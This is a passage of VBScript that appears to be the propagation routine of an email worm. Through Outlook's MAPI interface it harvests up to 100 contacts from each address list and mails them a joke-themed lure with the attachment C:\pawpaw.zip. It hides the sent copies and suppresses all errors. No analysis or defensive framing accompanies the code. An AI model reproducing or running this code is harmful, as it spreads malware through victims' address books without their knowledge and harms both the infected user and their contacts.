On Error Resume Next
Dim Fso
Set Fso = CreateObject("Scripting.FilesystemObject")
Set Mail01 = CreateObject("outlook.application")
    If Mail01 <> "" Then
	Set Mail02 = Mail01.GetNameSpace("MAPI")
	For Mail03 = 1 To Mail02.AddressLists.Count
	Set Mail04 = Mail02.AddressLists(Mail03)
            Mail05 = 1
	Set Mail06 = Mail01.CreateItem(0)
	For Mail07 = 1 To Mail04.AddressEntries.Count
	    Mail08 = Mail04.AddressEntries(Mail05)
	    Mail06.Recipients.Add Mail08
	    Mail05 = Mail05 + 1
	If Mail05 > 100 Then Exit For
	Next
	    Mail06.Subject = "No Subject"
	    Mail06.Body = "Hi there, just a bit of light hearted humor, but who knows, its one hell of a strong bear!"
	    Mail06.Attachments.Add "C:\pawpaw.zip"
	    Mail06.DeleteAfterSubmit = True
	    Mail06.Send
	    Mail08 = ""
	Next
	Const ForWriting = 2
